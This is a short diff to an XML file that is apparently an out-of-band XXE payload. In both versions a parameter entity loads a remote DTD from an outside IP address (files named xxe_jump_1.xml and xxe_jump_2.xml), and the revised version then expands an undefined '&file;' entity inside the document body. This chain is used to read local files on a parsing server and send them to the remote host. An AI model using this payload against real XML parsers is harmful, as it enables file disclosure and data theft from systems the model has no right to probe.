@@ -1,7 +1,9 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE rss [
-   <!ELEMENT rss ANY>
-   <!ENTITY % rem1 SYSTEM "http://35.180.29.78/c-tool-f/xxe_jump_1.xml">
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY>
+   <!ENTITY % rem1 SYSTEM "http://35.180.29.78:80/c-tool-f/xxe_jump_2.xml">
    %rem1;
 ]>
-<rss></rss>
+<lol>
+   &file;
+</lol>
